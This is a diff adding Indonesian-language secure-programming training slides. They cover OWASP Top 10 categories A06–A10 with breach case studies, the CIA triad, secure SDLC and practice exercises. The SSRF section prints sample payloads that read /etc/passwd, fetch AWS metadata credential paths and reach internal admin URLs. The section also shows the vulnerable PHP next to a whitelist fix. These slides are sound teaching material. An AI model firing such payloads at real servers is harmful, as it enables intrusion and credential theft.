+                    <div class="warning">
+                        <strong>Dampak:</strong> Eksploitasi vulnerability yang sudah diketahui publik
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Termasuk dependencies, libraries, frameworks, OS components, dan third-party software
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A06: Vulnerable Components - Penjelasan Detail</h3>
+                    <p>Vulnerability ini terjadi karena:</p>
+                    <ul>
+                        <li>Tidak mengetahui versi komponen yang digunakan</li>
+                        <li>Tidak memantau security advisories untuk dependencies</li>
+                        <li>Tidak update komponen secara rutin</li>
+                        <li>Menggunakan komponen yang tidak lagi didukung (end-of-life)</li>
+                        <li>Tidak melakukan vulnerability scanning</li>
+                        <li>Menggunakan komponen dari sumber tidak terpercaya</li>
+                        <li>Tidak memverifikasi integrity komponen sebelum install</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A06: Vulnerable Components - Contoh</h3>
+                    <ul>
+                        <li>Menggunakan jQuery versi lama dengan XSS vulnerability</li>
+                        <li>PHP versi lama (tidak lagi mendapat security patches)</li>
+                        <li>WordPress plugin yang tidak di-update</li>
+                        <li>Apache/nginx versi lama</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// package.json dengan vulnerable dependency</span>
+{
+  <span class="string">"dependencies"</span>: {
+    <span class="string">"express"</span>: <span class="string">"3.0.0"</span>  <span class="comment">// Versi lama dengan known vulnerabilities</span>
+  }
+}
+
+<span class="comment">// Log4j vulnerability (2021)</span>
+log4j-core:2.14.1  <span class="comment">// CVE-2021-44228</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Equifax breach tahun 2017 - Menggunakan Apache Struts versi lama dengan vulnerability yang sudah diketahui, 147 juta records dicuri
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A06: Vulnerable Components - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Equifax (2017)</h4>
+                            <p style="font-size: 0.75em;">Apache Struts CVE-2017-5638. 147 juta records dicuri. Patch tersedia 2 bulan sebelum breach tapi tidak di-apply.</p>
+                        </div>
+                        <div>
+                            <h4>2. Log4j (2021)</h4>
+                            <p style="font-size: 0.75em;">CVE-2021-44228 (Log4Shell). RCE vulnerability di library logging yang sangat populer. Mempengaruhi jutaan aplikasi.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. WannaCry (2017)</h4>
+                        <p style="font-size: 0.75em;">Mengeksploitasi Windows SMB vulnerability (CVE-2017-0144). 300,000+ komputer terinfeksi. Patch sudah tersedia 2 bulan sebelumnya.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Heartbleed (2014)</h4>
+                        <p style="font-size: 0.75em;">OpenSSL vulnerability (CVE-2014-0160). Mempengaruhi 500,000+ server. Bisa mengekstrak private keys dari memory.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A06: Vulnerable Components - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Pantau dan update dependencies secara rutin</li>
+                        <li>Gunakan dependency scanning tools (OWASP Dependency-Check, Snyk)</li>
+                        <li>Subscribe ke security advisories untuk komponen yang digunakan</li>
+                        <li>Hapus komponen yang tidak digunakan</li>
+                        <li>Gunakan package managers yang memverifikasi integrity</li>
+                        <li>Implementasikan Software Composition Analysis (SCA)</li>
+                        <li>Gunakan automated update mechanisms dengan testing</li>
+                        <li>Maintain inventory semua komponen dan versinya</li>
+                        <li>Test update di staging sebelum production</li>
+                    </ul>
+                </section>
+
+                <!-- A07: Authentication Failures -->
+                <section>
+                    <h3>A07:2021 – Identification and Authentication Failures</h3>
+                    <p><strong>Deskripsi:</strong> Weak authentication mechanisms, session management yang buruk</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Account takeover, identity theft, unauthorized access
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Prevalensi:</strong> 90% aplikasi tidak mengimplementasikan MFA (Multi-Factor Authentication)
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A07: Authentication Failures - Penjelasan Detail</h3>
+                    <p>Kegagalan authentication dapat terjadi karena:</p>
+                    <ul>
+                        <li>Password policy yang lemah (pendek, tidak kompleks)</li>
+                        <li>Password di-hash dengan algoritma lemah atau tanpa salt</li>
+                        <li>Tidak ada rate limiting pada login attempts</li>
+                        <li>Session management yang buruk (predictable IDs, no timeout)</li>
+                        <li>Tidak ada Multi-Factor Authentication (MFA)</li>
+                        <li>Weak password recovery mechanism</li>
+                        <li>Credential stuffing (reuse password dari breach lain)</li>
+                        <li>Session fixation attacks</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A07: Authentication Failures - Contoh</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Weak password policy</span>
+Password: <span class="string">"123456"</span>  <span class="comment">// Diterima!</span>
+
+<span class="comment">// Session fixation</span>
+session_id = <span class="string">"attacker_controlled_id"</span>
+<span class="comment">// Attacker bisa akses session korban</span>
+
+<span class="comment">// Password dalam plaintext</span>
+Database: password = <span class="string">"mypassword123"</span>
+
+<span class="comment">// Tidak ada MFA</span>
+Login hanya dengan username/password</code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Yahoo breach tahun 2013-2014 - 3 miliar akun dicuri karena weak password hashing dan tidak ada MFA
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A07: Authentication Failures - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Yahoo (2013-2014)</h4>
+                            <p style="font-size: 0.75em;">3 miliar akun dicuri. Password di-hash dengan MD5 (sangat lemah). Tidak ada MFA. Merupakan breach terbesar dalam sejarah.</p>
+                        </div>
+                        <div>
+                            <h4>2. Twitter (2020)</h4>
+                            <p style="font-size: 0.75em;">Social engineering attack. Tidak ada MFA untuk high-profile accounts. 130+ akun di-hack termasuk Obama, Biden, Musk.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. GitHub (2022)</h4>
+                        <p style="font-size: 0.75em;">Credential stuffing attack. 100,000+ npm accounts compromised karena password reuse dari breach lain.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. RockYou (2009)</h4>
+                        <p style="font-size: 0.75em;">32 juta password dalam plaintext dicuri. Menjadi basis untuk password cracking dictionaries hingga sekarang.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A07: Authentication Failures - Contoh Lain</h3>
+                    <ul>
+                        <li>Session ID di URL (dapat di-sniff)</li>
+                        <li>Tidak ada session timeout</li>
+                        <li>Brute force tidak dibatasi</li>
+                        <li>Credential stuffing (reuse password dari breach lain)</li>
+                        <li>Weak password recovery mechanism</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Session ID di URL</span>
+http://example.com/dashboard?session=abc123xyz
+
+<span class="comment">// Tidak ada rate limiting</span>
+<span class="comment">// Bisa coba 1000 password per detik</span></code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A07: Authentication Failures - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Implementasikan <strong>strong password policy</strong> (min 12 karakter, kompleks)</li>
+                        <li>Gunakan <strong>MFA</strong> (Multi-Factor Authentication) untuk akun penting</li>
+                        <li>Hash password dengan algoritma kuat (bcrypt, Argon2) + unique salt</li>
+                        <li>Implementasikan <strong>rate limiting</strong> pada login attempts</li>
+                        <li>Gunakan <strong>session management</strong> yang aman (random IDs, timeout, secure cookies)</li>
+                        <li>Deteksi dan blokir <strong>credential stuffing</strong> attacks</li>
+                        <li>Implementasikan <strong>account lockout</strong> setelah beberapa failed attempts</li>
+                        <li>Gunakan <strong>password strength meter</strong> untuk user</li>
+                        <li>Monitor dan alert untuk aktivitas login yang mencurigakan</li>
+                    </ul>
+                </section>
+
+                <!-- A08: Integrity Failures -->
+                <section>
+                    <h3>A08:2021 – Software and Data Integrity Failures</h3>
+                    <p><strong>Deskripsi:</strong> CI/CD pipeline yang tidak aman, update mechanism yang tidak terverifikasi</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Malicious code injection, supply chain attacks
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Kategori baru di OWASP Top 10 2021. Fokus pada integrity verification dan supply chain security.
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A08: Integrity Failures - Penjelasan Detail</h3>
+                    <p>Kegagalan integrity terjadi ketika:</p>
+                    <ul>
+                        <li>CI/CD pipeline tidak memverifikasi integrity code sebelum deploy</li>
+                        <li>Auto-update mechanism tidak memverifikasi signature</li>
+                        <li>Dependencies diinstall tanpa integrity checks</li>
+                        <li>Code dari sumber tidak terpercaya di-deploy tanpa review</li>
+                        <li>Tidak ada code signing atau verification</li>
+                        <li>Supply chain tidak aman (third-party components compromised)</li>
+                        <li>Data tidak memiliki integrity protection (checksums, signatures)</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A08: Integrity Failures - Contoh</h3>
+                    <ul>
+                        <li>CI/CD pipeline tanpa verifikasi</li>
+                        <li>Auto-update tanpa signature verification</li>
+                        <li>Dependency dari sumber tidak terpercaya</li>
+                        <li>Tidak ada integrity checks</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Auto-update tanpa verifikasi</span>
+npm install --force  <span class="comment">// Install tanpa check integrity</span>
+
+<span class="comment">// CI/CD tanpa security checks</span>
+git push origin master  <span class="comment">// Auto-deploy tanpa review</span>
+
+<span class="comment">// Dependency dari npm yang compromised</span>
+npm install malicious-package</code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> SolarWinds attack tahun 2020 - Malicious code di-inject ke update software, mempengaruhi 18,000 organisasi termasuk pemerintah AS
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A08: Integrity Failures - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. SolarWinds (2020)</h4>
+                            <p style="font-size: 0.75em;">Malicious code di-inject ke update software Orion. 18,000+ organisasi terpengaruh termasuk pemerintah AS, Microsoft, FireEye.</p>
+                        </div>
+                        <div>
+                            <h4>2. Codecov (2021)</h4>
+                            <p style="font-size: 0.75em;">CI/CD pipeline compromised. Malicious code di-inject ke bash uploader script. Ribuan customer terpengaruh.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. NotPetya (2017)</h4>
+                        <p style="font-size: 0.75em;">Supply chain attack melalui update software Ukranian accounting software. $10 miliar kerugian global.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. npm event-stream (2018)</h4>
+                        <p style="font-size: 0.75em;">Malicious package di-inject ke popular npm package. 2 juta+ downloads per week. Steal Bitcoin wallet data.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A08: Integrity Failures - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Verifikasi signature untuk semua updates dan dependencies</li>
+                        <li>Implementasikan code signing untuk releases</li>
+                        <li>Gunakan Software Bill of Materials (SBOM)</li>
+                        <li>Review dan audit CI/CD pipeline secara rutin</li>
+                        <li>Gunakan integrity checks (checksums, hashes) untuk data</li>
+                        <li>Implementasikan least privilege untuk CI/CD systems</li>
+                        <li>Monitor dan alert untuk perubahan yang tidak terduga</li>
+                        <li>Gunakan trusted repositories dan verify package integrity</li>
+                        <li>Implementasikan supply chain security practices</li>
+                    </ul>
+                </section>
+
+                <!-- A09: Logging Failures -->
+                <section>
+                    <h3>A09:2021 – Security Logging and Monitoring Failures</h3>
+                    <p><strong>Deskripsi:</strong> Logging yang tidak memadai, monitoring yang tidak efektif</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Tidak dapat mendeteksi serangan, tidak ada audit trail
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Tanpa logging dan monitoring yang efektif, serangan dapat berlangsung selama berminggu-minggu tanpa terdeteksi.
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A09: Logging Failures - Penjelasan Detail</h3>
+                    <p>Kegagalan logging dan monitoring terjadi ketika:</p>
+                    <ul>
+                        <li>Tidak log event security penting (failed logins, privilege escalations)</li>
+                        <li>Log tidak dipantau secara real-time</li>
+                        <li>Tidak ada alert untuk aktivitas mencurigakan</li>
+                        <li>Log mudah dihapus atau dimodifikasi oleh attacker</li>
+                        <li>Tidak ada correlation antara log dari berbagai sumber</li>
+                        <li>Log tidak disimpan dengan aman (tamper-proof)</li>
+                        <li>Tidak ada incident response plan</li>
+                        <li>Log tidak mencakup context yang cukup untuk forensics</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A09: Logging Failures - Contoh</h3>
+                    <ul>
+                        <li>Tidak log failed login attempts</li>
+                        <li>Tidak log perubahan data penting</li>
+                        <li>Log tidak dipantau secara real-time</li>
+                        <li>Log mudah dihapus atau dimodifikasi</li>
+                        <li>Tidak ada alert untuk aktivitas mencurigakan</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// Tidak ada logging</span>
+<span class="keyword">function</span> <span class="function">deleteUser</span>($id) {
+    <span class="comment">// Delete user tanpa log</span>
+    $db-><span class="function">delete</span>(<span class="string">"users"</span>, $id);
+}
+
+<span class="comment">// Log tidak dipantau</span>
+<span class="comment">// Serangan terjadi selama berminggu-minggu tanpa diketahui</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Target breach tahun 2013 - Penyerang mengakses sistem selama 2 minggu sebelum terdeteksi karena kurangnya monitoring
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A09: Logging Failures - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Target (2013)</h4>
+                            <p style="font-size: 0.75em;">Penyerang mengakses sistem selama 2 minggu sebelum terdeteksi. 40 juta kartu kredit dicuri. Monitoring tidak efektif.</p>
+                        </div>
+                        <div>
+                            <h4>2. Equifax (2017)</h4>
+                            <p style="font-size: 0.75em;">Serangan berlangsung selama 76 hari tanpa terdeteksi. 147 juta records dicuri. Logging tidak memadai.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. Marriott/Starwood (2018)</h4>
+                        <p style="font-size: 0.75em;">Serangan berlangsung selama 4 tahun (2014-2018) tanpa terdeteksi. 500 juta records dicuri. Tidak ada monitoring.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Yahoo (2013-2014)</h4>
+                        <p style="font-size: 0.75em;">Serangan tidak terdeteksi selama bertahun-tahun. 3 miliar akun dicuri. Logging dan monitoring sangat lemah.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A09: Logging Failures - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Log semua event security penting (logins, failures, privilege changes)</li>
+                        <li>Implementasikan <strong>real-time monitoring</strong> dan alerting</li>
+                        <li>Gunakan <strong>SIEM</strong> (Security Information and Event Management)</li>
+                        <li>Lindungi log dari tampering (write-only, integrity checks)</li>
+                        <li>Simpan log dengan retention policy yang sesuai</li>
+                        <li>Correlate log dari berbagai sumber untuk deteksi serangan</li>
+                        <li>Implementasikan <strong>incident response plan</strong></li>
+                        <li>Test monitoring dan alerting secara rutin</li>
+                        <li>Include sufficient context dalam log untuk forensics</li>
+                    </ul>
+                </section>
+
+                <!-- A10: SSRF -->
+                <section>
+                    <h3>A10:2021 – Server-Side Request Forgery (SSRF)</h3>
+                    <p><strong>Deskripsi:</strong> Aplikasi membuat request ke URL yang tidak terpercaya, bypass firewall</p>
+                    <div class="warning">
+                        <strong>Dampak:</strong> Akses ke internal resources, port scanning internal, data exfiltration
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Kategori baru di OWASP Top 10 2021. Sangat berbahaya di cloud environments.
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A10: SSRF - Penjelasan Detail</h3>
+                    <p>SSRF terjadi ketika aplikasi membuat HTTP request ke URL yang dikontrol oleh attacker:</p>
+                    <ul>
+                        <li>Aplikasi menerima URL dari user tanpa validasi</li>
+                        <li>Server membuat request ke URL tersebut</li>
+                        <li>Attacker dapat mengarahkan request ke internal resources</li>
+                        <li>Bypass firewall karena request berasal dari server (trusted)</li>
+                        <li>Dapat mengakses cloud metadata services (AWS, Azure, GCP)</li>
+                        <li>Dapat melakukan port scanning internal network</li>
+                        <li>Dapat membaca file system melalui file:// protocol</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>A10: SSRF - Contoh</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Vulnerable code</span>
+$url = $_GET[<span class="string">'url'</span>];
+$content = <span class="function">file_get_contents</span>($url);
+
+<span class="comment">// Exploit</span>
+?url=http://localhost:3306        <span class="comment">// Akses MySQL</span>
+?url=file:///etc/passwd           <span class="comment">// Baca file system</span>
+?url=http://169.254.169.254/      <span class="comment">// AWS metadata (cloud)</span>
+?url=http://127.0.0.1/admin      <span class="comment">// Akses admin panel internal</span></code></pre>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Real-world:</strong> Capital One breach tahun 2019 - SSRF vulnerability memungkinkan akses ke AWS metadata service, 100 juta records dicuri
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A10: SSRF - Contoh Kasus Real-World</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>1. Capital One (2019)</h4>
+                            <p style="font-size: 0.75em;">SSRF vulnerability memungkinkan akses ke AWS metadata service. 100 juta records dicuri termasuk SSN dan kartu kredit.</p>
+                        </div>
+                        <div>
+                            <h4>2. GitHub (2020)</h4>
+                            <p style="font-size: 0.75em;">SSRF vulnerability di GitHub Actions memungkinkan akses ke internal services dan metadata.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>3. Microsoft Exchange (2021)</h4>
+                        <p style="font-size: 0.75em;">SSRF vulnerability (ProxyLogon) memungkinkan remote code execution. 250,000+ servers terpengaruh.</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <h4>4. Docker (2019)</h4>
+                        <p style="font-size: 0.75em;">SSRF vulnerability di Docker API memungkinkan akses ke internal Docker daemon dan file system.</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A10: SSRF - Attack Vectors</h3>
+                    <ul>
+                        <li><strong>Cloud Metadata:</strong> AWS, Azure, GCP metadata services</li>
+                        <li><strong>Internal Services:</strong> Database, admin panels, internal APIs</li>
+                        <li><strong>Localhost:</strong> Services yang hanya accessible dari server</li>
+                        <li><strong>File Protocol:</strong> file:// untuk membaca file system</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment">// AWS Metadata</span>
+http://169.254.169.254/latest/meta-data/
+iam/security-credentials/role-name
+
+<span class="comment">// Internal network scan</span>
+http://192.168.1.1:8080
+http://10.0.0.1/admin</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>A10: SSRF - Cara Mencegah</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li>Validasi dan sanitize semua input URL dari user</li>
+                        <li>Gunakan <strong>whitelist</strong> untuk allowed URLs/hosts</li>
+                        <li>Blokir private/internal IP addresses (127.0.0.1, 10.x.x.x, 192.168.x.x)</li>
+                        <li>Blokir cloud metadata IPs (169.254.169.254 untuk AWS)</li>
+                        <li>Disable redirects atau validasi redirect destinations</li>
+                        <li>Gunakan URL parsing library yang aman</li>
+                        <li>Implementasikan network segmentation</li>
+                        <li>Gunakan outbound firewall rules untuk membatasi akses</li>
+                        <li>Validasi response untuk memastikan sesuai dengan yang diharapkan</li>
+                    </ul>
+                    <div class="code-block" style="margin-top: 15px;">
+<pre><code><span class="comment">// Safe: Whitelist validation</span>
+$allowedHosts = [<span class="string">'api.example.com'</span>, <span class="string">'cdn.example.com'</span>];
+<span class="keyword">if</span> (!<span class="function">in_array</span>(<span class="function">parse_url</span>($url, PHP_URL_HOST), $allowedHosts)) {
+    <span class="keyword">throw new</span> <span class="function">Exception</span>(<span class="string">'Invalid host'</span>);
+}</code></pre>
+                    </div>
+                </section>
+
+                <!-- Summary OWASP Top 10 -->
+                <section>
+                    <h2>Ringkasan OWASP Top 10</h2>
+                    <div class="success">
+                        <h3>Kategori Serangan:</h3>
+                        <ul style="font-size: 0.85em;">
+                            <li><strong>A01-A03:</strong> Access & Injection (Paling umum)</li>
+                            <li><strong>A04-A05:</strong> Design & Configuration</li>
+                            <li><strong>A06-A07:</strong> Components & Authentication</li>
+                            <li><strong>A08-A10:</strong> Integrity, Logging, SSRF</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Statistik OWASP Top 10</h3>
+                    <ul>
+                        <li><strong>A01 (Broken Access Control):</strong> 94% aplikasi memiliki vulnerability ini</li>
+                        <li><strong>A03 (Injection):</strong> 19% aplikasi memiliki SQL injection</li>
+                        <li><strong>A07 (Auth Failures):</strong> 90% aplikasi tidak mengimplementasikan MFA</li>
+                    </ul>
+                    <div class="info" style="margin-top: 20px;">
+                        <strong>Penting:</strong> Kombinasi beberapa vulnerability dapat menyebabkan serangan yang lebih parah
+                    </div>
+                </section>
+            </section>
+
+            <!-- 1.4 Introduction to Computer Security -->
+            <section>
+                <section>
+                    <h2>1.4 Introduction to Computer Security</h2>
+                    <p>Perlindungan sistem komputer dari akses tidak sah, kerusakan, atau pencurian informasi</p>
+                </section>
+
+                <section>
+                    <h3>CIA Triad</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Confidentiality</h4>
+                            <p>Kerahasiaan - Data hanya dapat diakses oleh pihak yang berwenang</p>
+                            <p><strong>Teknik:</strong> Encryption, Access Control</p>
+                        </div>
+                        <div>
+                            <h4>Integrity</h4>
+                            <p>Integritas - Data tidak diubah oleh pihak yang tidak berwenang</p>
+                            <p><strong>Teknik:</strong> Hashing, Digital Signatures</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 20px;">
+                        <h4>Availability</h4>
+                        <p>Ketersediaan - Data dan sistem tersedia saat dibutuhkan</p>
+                        <p><strong>Teknik:</strong> Redundancy, Backup, DDoS Protection</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Konsep Keamanan Tambahan</h3>
+                    <ul>
+                        <li><strong>Authentication</strong>: Verifikasi identitas pengguna</li>
+                        <li><strong>Authorization</strong>: Penentuan hak akses pengguna</li>
+                        <li><strong>Non-repudiation</strong>: Tidak dapat menyangkal tindakan</li>
+                        <li><strong>Accountability</strong>: Dapat dilacak siapa yang melakukan apa</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Threat Model</h3>
+                    <ul>
+                        <li><strong>Threats</strong>: Potensi bahaya terhadap sistem</li>
+                        <li><strong>Vulnerabilities</strong>: Kelemahan dalam sistem</li>
+                        <li><strong>Risks</strong>: Kombinasi threat dan vulnerability</li>
+                        <li><strong>Countermeasures</strong>: Tindakan untuk mengurangi risiko</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- 1.5 Secure Programming in SDLC -->
+            <section>
+                <section>
+                    <h2>1.5 Implementation of Secure Programming in The SDLC</h2>
+                    <p>Mengintegrasikan praktik keamanan ke dalam setiap fase pengembangan</p>
+                </section>
+
+                <section>
+                    <h3>Fase SDLC dengan Security Integration</h3>
+                    <ol>
+                        <li><strong>Planning & Requirements</strong>: Security requirements, Threat modeling</li>
+                        <li><strong>Design</strong>: Secure design principles, Security architecture</li>
+                        <li><strong>Development</strong>: Secure coding, Code reviews, SAST</li>
+                        <li><strong>Testing</strong>: Security testing, DAST, Penetration testing</li>
+                        <li><strong>Deployment</strong>: Secure configuration, Environment hardening</li>
+                        <li><strong>Maintenance</strong>: Patch management, Security updates</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Secure Coding Principles</h3>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Defense in Depth</strong>: Multiple layers of security</li>
+                        <li><strong>Least Privilege</strong>: Minimum access yang diperlukan</li>
+                        <li><strong>Fail Secure</strong>: Sistem gagal dalam kondisi aman</li>
+                        <li><strong>Input Validation</strong>: Selalu validasi input</li>
+                        <li><strong>Output Encoding</strong>: Encode output untuk mencegah injection</li>
+                        <li><strong>Error Handling</strong>: Jangan expose informasi sensitif</li>
+                        <li><strong>Secure Defaults</strong>: Konfigurasi default yang aman</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- Practical Session -->
+            <section>
+                <section>
+                    <h2>Sesi Praktik Day 1</h2>
+                    <p>Praktik yang dapat diikuti peserta untuk memahami konsep keamanan</p>
+                </section>
+
+                <section>
+                    <h3>Praktik 1: Membuat Dokumentasi Ethical Hacking</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Memahami metodologi ethical hacking dan membuat dokumentasi
+                    </div>
+                    <ol>
+                        <li>Buat dokumen Word/Google Docs dengan struktur:</li>
+                        <ul>
+                            <li>Cover page dengan judul "Ethical Hacking Methodology"</li>
+                            <li>Penjelasan 6 fase ethical hacking</li>
+                            <li>Tools yang digunakan di setiap fase</li>
+                            <li>Contoh kasus untuk setiap fase</li>
+                        </ul>
+                        <li>Gunakan template berikut:</li>
+                    </ol>
+                    <div class="code-block">
+<pre><code><span class="comment"># Ethical Hacking Methodology Document</span>
+
+<span class="comment">## 1. Reconnaissance</span>
+- Tools: Google dorking, WHOIS, DNS lookup
+- Contoh: Mencari informasi domain target
+- Dokumentasi: Screenshot hasil pencarian
+
+<span class="comment">## 2. Scanning</span>
+- Tools: Nmap, Nessus
+- Contoh: Port scanning pada target
+- Dokumentasi: Hasil scan dan analisis
+
+<span class="comment">## 3. Gaining Access</span>
+- Tools: Metasploit, Burp Suite
+- Contoh: Eksploitasi vulnerability
+- Dokumentasi: Langkah-langkah eksploitasi
+
+<span class="comment">## 4-6. (Lanjutkan untuk fase lainnya)</span></code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktik 2: Analisis OWASP Top 10</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Memahami dan menganalisis setiap kategori OWASP Top 10
+                    </div>
+                    <ol>
+                        <li>Buat spreadsheet dengan kolom:</li>
+                        <ul>
+                            <li>Kategori (A01-A10)</li>
+                            <li>Nama Vulnerability</li>
+                            <li>Deskripsi</li>
+                            <li>Dampak</li>
+                            <li>Contoh Kasus Real-World</li>
+                            <li>Cara Mencegah</li>
+                        </ul>
+                        <li>Isi untuk semua 10 kategori</li>
+                        <li>Cari 2 contoh kasus real-world tambahan untuk setiap kategori</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktik 3: Membuat Threat Model</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Menerapkan threat modeling untuk aplikasi web sederhana
+                    </div>
+                    <p><strong>Scenario:</strong> Aplikasi web e-commerce sederhana dengan fitur:</p>
+                    <ul>
+                        <li>Login/Register</li>
+                        <li>Product listing</li>
+                        <li>Shopping cart</li>
+                        <li>Checkout</li>
+                    </ul>
+                    <div class="code-block">
+<pre><code><span class="comment"># Threat Model Template</span>
+
+<span class="comment">## 1. Identifikasi Assets</span>
+- Data: User credentials, payment info, product data
+- System: Web server, database, payment gateway
+
+<span class="comment">## 2. Identifikasi Threats</span>
+- Unauthorized access to user accounts
+- SQL injection pada login
+- XSS pada product listing
+- CSRF pada checkout
+
+<span class="comment">## 3. Identifikasi Vulnerabilities</span>
+- Weak password policy
+- No input validation
+- No CSRF protection
+- Insecure session management
+
+<span class="comment">## 4. Risk Assessment</span>
+- High: Payment data breach
+- Medium: User account takeover
+- Low: Product data exposure
+
+<span class="comment">## 5. Countermeasures</span>
+- Implement MFA
+- Use prepared statements
+- Implement CSRF tokens
+- Secure session management</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktik 4: Analisis CIA Triad</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Menerapkan konsep CIA Triad pada skenario nyata
+                    </div>
+                    <p><strong>Latihan:</strong> Untuk setiap skenario berikut, identifikasi:</p>
+                    <ol>
+                        <li>Aspek CIA mana yang terancam?</li>
+                        <li>Bagaimana cara melindunginya?</li>
+                    </ol>
+                    <div class="two-column">
+                        <div>
+                            <h4>Skenario 1:</h4>
+                            <p>Password database bocor ke internet</p>
+                        </div>
+                        <div>
+                            <h4>Skenario 2:</h4>
+                            <p>Data transaksi diubah oleh attacker</p>
+                        </div>
+                    </div>
+                    <div style="margin-top: 20px;">
+                        <h4>Skenario 3:</h4>
+                        <p>Server down karena DDoS attack</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktik 5: Checklist Secure SDLC</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Membuat checklist untuk implementasi secure SDLC
+                    </div>
+                    <p>Buat checklist untuk setiap fase SDLC dengan security requirements:</p>
+                    <div class="code-block">
+<pre><code><span class="comment"># Secure SDLC Checklist</span>
+
+<span class="comment">## Planning & Requirements</span>
+[ ] Security requirements defined
+[ ] Threat modeling completed
+[ ] Security architecture reviewed
+
+<span class="comment">## Design</span>
+[ ] Secure design patterns applied
+[ ] Security controls identified
+[ ] Security review conducted
+
+<span class="comment">## Development</span>
+[ ] Secure coding guidelines followed
+[ ] Code review completed
+[ ] SAST tools used
+
+<span class="comment">## Testing</span>
+[ ] Security testing performed
+[ ] Penetration testing done
+[ ] Vulnerability scanning completed
+
+<span class="comment">## Deployment</span>
+[ ] Security configuration reviewed
+[ ] Environment hardened
+[ ] Security monitoring enabled
+
+<span class="comment">## Maintenance</span>
+[ ] Security patches applied
+[ ] Regular security audits
+[ ] Incident response plan ready</code></pre>
+                    </div>
+                </section>
